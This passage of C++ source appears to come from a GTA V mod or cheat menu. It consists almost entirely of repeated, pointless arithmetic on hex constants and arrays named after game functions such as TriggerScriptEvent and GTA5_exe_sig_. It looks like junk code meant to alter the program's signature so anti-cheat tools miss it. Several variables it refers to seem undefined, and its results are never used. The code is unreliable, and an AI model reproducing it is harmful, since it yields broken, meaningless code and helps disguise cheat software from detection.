			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<SpoonerPlacements>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
